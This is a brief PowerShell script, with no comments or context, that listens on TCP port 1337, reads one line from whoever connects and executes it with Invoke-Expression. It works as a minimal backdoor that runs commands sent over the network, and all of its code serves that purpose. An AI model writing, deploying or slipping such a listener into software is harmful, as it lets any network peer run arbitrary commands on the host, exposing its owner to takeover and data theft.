$port=1337
$listener = [System.Net.Sockets.TcpListener]$port  
$listener.start()
$connection = $listener.AcceptTcpClient()
$stream = $connection.GetStream()

#Method 1
#$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
#[byte[]]$bytes = 0..65535|%{0}
#$numberOfBytes = $stream.Read($bytes, 0, $bytes.Length)
#$cmd = $EncodedText.GetString($bytes,0, $numberOfBytes)

#Method 2
$reader = New-Object System.IO.StreamReader $stream
$cmd = $reader.ReadLine()

Invoke-Expression -Command $cmd 2>&1 | Out-String

#$reader.Dispose()
$stream.Dispose()
$connection.Dispose()
$listener.stop()


